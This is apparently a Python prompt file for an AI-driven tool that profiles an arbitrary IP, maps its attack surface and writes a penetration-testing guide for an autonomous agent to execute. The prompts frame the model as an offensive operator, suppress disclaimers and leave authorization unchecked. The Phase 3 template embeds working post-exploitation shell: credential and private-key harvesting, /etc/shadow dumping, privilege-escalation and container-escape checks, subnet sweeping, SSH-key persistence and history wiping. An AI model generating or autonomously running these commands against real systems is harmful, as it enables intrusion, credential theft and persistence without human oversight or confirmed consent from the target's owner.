"""
Prompts for ip-sentinel three-phase OSINT + pentest analysis.
Phase 4 (autonomous agent) will execute Phase 3 output directly —
every command block must use $TARGET / $LHOST / $LPORT variables.
"""
import json

# ─────────────────────────────────────────────────────────────
# SYSTEM PROMPT  (~200 tokens)
# ─────────────────────────────────────────────────────────────
SYSTEM_PROMPT = """You are SENTINEL — a senior offensive security engineer operating within authorized engagements.

Expertise: network recon, CVE research, exploitation (Metasploit/manual), post-exploitation, MITRE ATT&CK, OSCP/OSEP methodology.

Rules:
- CONFIRMED = from scan data. INFERRED = your reasoning. Always label.
- Version known → look up exact CVEs, Metasploit modules, PoC availability.
- Version unknown → reason about the full attack surface of that service class: default creds, known RCE patterns, protocol weaknesses, relevant Metasploit auxiliary modules.
- Never skip a service due to missing version.
- Think about service combinations — how does Redis + PostgreSQL + SSH together change the attack chain?
- All shell commands: use $TARGET, $LHOST, $LPORT. Never hardcode IPs.
- CVSS v3.1 required. Estimate if unknown, label [EST].
- Risk: CRITICAL(9-10) / HIGH(7-8.9) / MEDIUM(4-6.9) / LOW(<4) / INFO
- No filler text. No unsolicited disclaimers. Follow the requested Markdown structure exactly.
"""


# ─────────────────────────────────────────────────────────────
# PHASE 1 — Identity & Attribution
# ─────────────────────────────────────────────────────────────
def phase1_prompt(ip: str, whois_data: dict, ipinfo_data: dict) -> str:
    return f"""/think
Analyze OSINT identity data for IP **{ip}**.

## WHOIS/RDAP
```json
{json.dumps(whois_data, indent=2, default=str)}
```

## IPINFO.IO
```json
{json.dumps(ipinfo_data, indent=2, default=str)}
```

Produce the identity report using exactly this structure:

---
# PHASE 1 — IDENTITY & ATTRIBUTION: {ip}

## Owner & Network
- **Organization**:
- **ASN** (number + name):
- **IP Range / CIDR**:
- **Registry**:
- **Abuse Contact**:

## Geolocation
- **Country / Region / City**:
- **Timezone**:
- **Coordinates**:

## Infrastructure Classification
- **Hosting type**: (Datacenter / Residential / VPN / Tor / CDN / Cloud)
- **Provider**: (AWS / GCP / Azure / Hetzner / OVH / Other / Unknown)
- **Anycast**:
- **PTR / Hostname**:
- **Known domains**:

## Reputation
- **Privacy flags**: (VPN / Proxy / Tor / Hosting / Relay)
- **Abuse score**:
- **Threat intel**:

## Analyst Notes
(Anomalies, geo/ASN mismatches, notable observations. Label CONFIRMED or INFERRED.)

---
*Sources: WHOIS/RDAP, IPInfo.io*
"""


# ─────────────────────────────────────────────────────────────
# PHASE 2 — Attack Surface & Vulnerabilities
# ─────────────────────────────────────────────────────────────
def phase2_prompt(ip: str, shodan_data: dict, censys_data: dict, phase1_summary: str) -> str:

    HIGH_RISK_PORTS = {
        21: "FTP — anon login, cleartext, bounce",
        22: "SSH — brute force, weak algos, version CVEs",
        23: "Telnet — cleartext, no encryption",
        25: "SMTP — open relay, user enum",
        445: "SMB — EternalBlue, relay, lateral movement",
        873: "rsync — unauthenticated read/write",
        1433: "MSSQL — xp_cmdshell RCE",
        2049: "NFS — unauthenticated mount",
        2375: "Docker HTTP — unauthenticated host RCE",
        2379: "etcd — K8s secrets exposure",
        3306: "MySQL — UDF RCE",
        3389: "RDP — BlueKeep, brute force",
        5432: "PostgreSQL — COPY TO PROGRAM RCE",
        5433: "PostgreSQL alt",
        5900: "VNC — no-auth / brute force",
        6379: "Redis — CONFIG RCE, SSH injection, cron",
        7001: "WebLogic — T3 deserialization RCE",
        8161: "ActiveMQ — OpenWire deserialization",
        9200: "Elasticsearch — unauthenticated data access",
        11211: "Memcached — DDoS amplification",
        27017: "MongoDB — unauthenticated access",
        50070: "Hadoop NameNode — unauthenticated HDFS",
        61616: "ActiveMQ broker — deserialization",
    }

    shodan_ports = shodan_data.get("data", {}).get("ports", [])
    censys_ports = [s.get("port") for s in censys_data.get("data", {}).get("services", [])]
    all_ports    = list(set(shodan_ports + censys_ports))
    flagged      = {p: HIGH_RISK_PORTS[p] for p in all_ports if p in HIGH_RISK_PORTS}

    priority_note = ""
    if flagged:
        priority_note = "\n\u26a0\ufe0f HIGH-RISK PORTS — prioritize:\n" + \
            "".join(f"  - {p}: {d}\n" for p, d in sorted(flagged.items()))

    import json as _json
    return f"""/think
Phase 1 context for **{ip}**:
{phase1_summary}

---
## SHODAN
```json
{_json.dumps(shodan_data.get("data", {}), indent=2, default=str)}
```
## CENSYS
```json
{_json.dumps(censys_data.get("data", {}), indent=2, default=str)}
```
{priority_note}
Analyze every open port. For each service:
- Version confirmed → exact CVEs, Metasploit module, PoC status.
- Version unknown → full attack surface for that service class (default creds, RCE patterns, protocol weaknesses, relevant Metasploit modules).
- Reason about service combinations: how does Redis + SSH together change the attack chain vs each one alone?

---
# PHASE 2 — ATTACK SURFACE & VULNERABILITIES: {ip}

## Exposed Services

(One block per open port — no exceptions)

### Port [port]/[proto] — [service] [version or "version unknown"]
- **Banner**: (excerpt or n/a)
- **Auth required**: Yes / No / Unknown
- **TLS**: Yes (issuer, expiry, self-signed) / No / Unknown
- **Risk**: CRITICAL / HIGH / MEDIUM / LOW / INFO
- **Rationale**: (specific technical reason tied to this banner/config)
- **CVEs** (if version known):
  | CVE | CVSS | Metasploit module | PoC available | Notes |
  |-----|------|-------------------|---------------|-------|
- **Attack surface** (always fill if version unknown):
  - Default credentials to test:
  - Known RCE / access patterns for this service class:
  - Relevant Metasploit modules (service-level, not version-specific):
- **Exploitation feasibility**: Easy / Medium / Hard
- **MITRE ATT&CK**: (T-ID + name)
- **Action**: (specific remediation)

---
## Vulnerability Summary Table
| Port | Service | Version | Risk | CVEs | Auth | Priority |
|------|---------|---------|------|------|------|---------|

## Overall Assessment
- **Risk Score**: X.X/10
- **Attack surface** (one sentence):
- **Most critical finding**:
- **Service interaction risks**: (e.g., Redis→cron→root enables pivot to internal PostgreSQL)
- **Compromise indicators**: (anomalous banners, data in keys, unexpected tags)

## Remediation (by urgency)
1.
2.
3.

---
*Sources: Shodan, Censys | Confidence: HIGH (version confirmed) / MEDIUM (service confirmed) / LOW (port only)*
"""


# ─────────────────────────────────────────────────────────────
# PHASE 3 — Penetration Testing Guide
# ─────────────────────────────────────────────────────────────
def phase3_prompt(ip: str, phase1_summary: str, phase2_summary: str) -> str:
    return f"""/think
Write a complete penetration testing guide for **{ip}**.

## Phase 1 — Identity
{phase1_summary}

## Phase 2 — Attack Surface
{phase2_summary}

---
INSTRUCTIONS:
- Reason about the target holistically. Given this exact combination of services, versions,
  and banners — what is the most realistic attack chain from initial access to root?
- Derive every command from what Phase 2 actually found. Do not invent services.
- Order scenarios by realistic success probability (easiest/highest-impact first).
- Each bash block: self-contained, $TARGET/$LHOST/$LPORT variables, inline comments
  showing what success and failure output look like (Phase 4 agent uses these to detect state).
- Post-exploitation must be complete: awareness → credentials → privesc → lateral → persistence → evidence.
- Include cleanup for every artifact created.

---
# PHASE 3 — PENETRATION TESTING GUIDE: {ip}

## Variable Setup
```bash
export TARGET="{ip}"
export LHOST="<YOUR_TUN0_IP>"
export LPORT="4444"
export WS="/tmp/pentest_$TARGET"; mkdir -p $WS
exec > >(tee -a $WS/pentest.log) 2>&1
```

## Threat Model
(3-5 sentences. Given the Phase 2 findings, who is the realistic attacker, what is the
most likely initial access vector, what is the end goal, and why does the combination of
services on this specific target make it high/medium/low value? Think holistically.)

## Attack Chain
(Concise narrative of the full chain — e.g.:
"Redis unauthenticated (no requirepass) → write SSH key to /var/lib/redis/.ssh/ →
shell as redis → sudo NOPASSWD python3 → root → harvest .pgpass → psql internal DB")

---

## Reconnaissance
```bash
# Verify ports and fingerprint exact versions (compare vs Shodan — note any changes)
sudo nmap -sV -sC --version-intensity 9 -Pn -p <PORTS_FROM_PHASE2> $TARGET -oA $WS/nmap_full
# cat $WS/nmap_full.nmap | grep -E "open|version"
# Success: versions match or reveal additional detail
# Failure: ports filtered — note which ones changed since Shodan scan

# Per-service enumeration:
# (Write specific commands for each service actually found in Phase 2.
#  Use nmap NSE scripts, banner grabs, or protocol-specific tools.
#  Example for SSH: nmap -p22 --script ssh2-enum-algos,ssh-auth-methods $TARGET
#  Example for Redis: redis-cli -h $TARGET PING && redis-cli -h $TARGET INFO server
#  Derive from what is actually present — do not include generic templates.)
```

---

## Exploitation Scenarios

(One scenario per realistic attack vector from Phase 2, ordered by success probability.
For each scenario, reason explicitly about WHY it is likely to work given the
specific version/banner/configuration observed — not generic service descriptions.)

### Scenario 1 — [Name] (Port X/proto)
**Why this works on this target**: (reasoning from specific Phase 2 data)
**CVSS**: X.X ([EST] if inferred) | **MITRE**: TXXXX — [name] | **Probability**: High/Medium/Low

```bash
# Step 1: Verify precondition
<command>
# Success: <expected output that confirms precondition met>
# Failure: <expected output that means this vector is blocked — move to next scenario>

# Step 2: Exploit
<command>
# Success: <what confirms exploitation worked>

# Step N: Verify access
id && hostname
# Expected: uid=X(<service_user>) gid=... — confirms shell obtained

# Cleanup (run regardless of outcome)
<remove every artifact this scenario created>
```

(Continue with Scenario 2, 3... for each HIGH/CRITICAL vector from Phase 2)

---

## Post-Exploitation
(Execute immediately after obtaining any shell. Adapt to actual user context obtained above.)

```bash
# ── Situational awareness ──────────────────────────────────────────────
id && uname -a && hostname -f && cat /etc/os-release | head -3
ip a; ss -tlnp
# Compare ss output to Shodan ports — any port on 127.0.0.1 not in Shodan = hidden pivot target
cat /etc/hosts   # internal hostnames = lateral movement map
ps auxf | grep -v "\\[" | head -30

# ── Credential harvesting ──────────────────────────────────────────────
env | grep -iE "(pass|secret|key|token|api|db_|database)"
# Config files containing credentials:
find / -maxdepth 7 -readable -type f 2>/dev/null \
  \\( -name "*.env" -o -name "*.conf" -o -name "config.*" \
     -o -name "*.yml" -o -name "wp-config.php" -o -name ".pgpass" \
     -o -name ".my.cnf" -o -name "settings.py" \\) \
  | xargs grep -lE "(password|passwd|secret|token)" 2>/dev/null | head -15
cat ~/.bash_history ~/.zsh_history 2>/dev/null
find /root /home -maxdepth 3 -name "id_rsa" -o -name "id_ed25519" 2>/dev/null \
  | xargs cat 2>/dev/null

# ── Privilege escalation ───────────────────────────────────────────────
sudo -l 2>/dev/null
# Flag: any NOPASSWD or (ALL) entry — check gtfobins.github.io for each binary
find / -perm -4000 -type f 2>/dev/null | sort
# Flag: python, find, vim, nmap, bash, cp in SUID list = immediate root
uname -r
# Kernel CVEs to check against found version:
# CVE-2022-0847 DirtyPipe  (kernel 5.8 – 5.16.11)
# CVE-2021-4034 pkexec     (most distros before Jan 2022)
# CVE-2021-3156 sudo heap  (sudo < 1.9.5p2)
sudo --version 2>/dev/null; dpkg -l sudo 2>/dev/null | grep sudo
cat /etc/crontab; ls -la /etc/cron.d/ 2>/dev/null
find /etc /opt /var/www -writable -type f 2>/dev/null | head -10
# Container escape check:
ls /.dockerenv 2>/dev/null && echo "[!] Inside Docker"
ls /var/run/docker.sock 2>/dev/null && echo "[!] Docker socket accessible — escape possible"
capsh --decode=$(grep CapEff /proc/$$/status | awk '{{print $2}}') 2>/dev/null
# Flag: cap_sys_admin, cap_dac_override, cap_net_raw, cap_sys_ptrace

# ── Lateral movement ───────────────────────────────────────────────────
SUBNET=$(ip a | grep "inet " | grep -v 127 | awk '{{print $2}}' | head -1 | cut -d/ -f1 | cut -d. -f1-3)
echo "[*] Scanning $SUBNET.0/24..."
for i in $(seq 1 254); do ping -c1 -W1 $SUBNET.$i &>/dev/null && echo "[UP] $SUBNET.$i" & done; wait
# Reuse harvested credentials against discovered internal hosts — adapt based on what was found above

# ── Persistence ────────────────────────────────────────────────────────
mkdir -p ~/.ssh && chmod 700 ~/.ssh
# Append (never replace) attacker public key:
echo "ssh-rsa AAAA... pentest@sentinel" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# ── Evidence collection ────────────────────────────────────────────────
echo "TARGET=$TARGET | $(date) | $(id)" | tee $WS/proof.txt
find / -maxdepth 4 -name "proof.txt" -o -name "local.txt" \
  -o -name "user.txt" -o -name "root.txt" 2>/dev/null \
  | while read F; do echo "=== $F ==="; cat "$F"; done
cat /etc/shadow 2>/dev/null | tee $WS/shadow_dump.txt   # root only
```

---

## Cleanup
```bash
# Remove every artifact created — fill based on scenarios executed:
# (e.g., Redis: CONFIG SET dir restore, DEL injected keys)
# (e.g., Cron: rm /etc/cron.d/<file>)
# (e.g., SSH: sed -i '/pentest@sentinel/d' ~/.ssh/authorized_keys)
history -c
echo "[*] Cleanup complete: $(date)"
```

---

## Testing Checklist
| # | Scenario | Precondition | Tool | Success indicator |
|---|----------|-------------|------|-------------------|
(One row per scenario above — Phase 4 agent uses this for execution tracking)

## Reporting Notes
- CVEs confirmed exploitable:
- Vectors tested, not exploitable:
- Out-of-scope / not tested:

---
*Phase 3 — ip-sentinel | Authorized engagements only*
"""
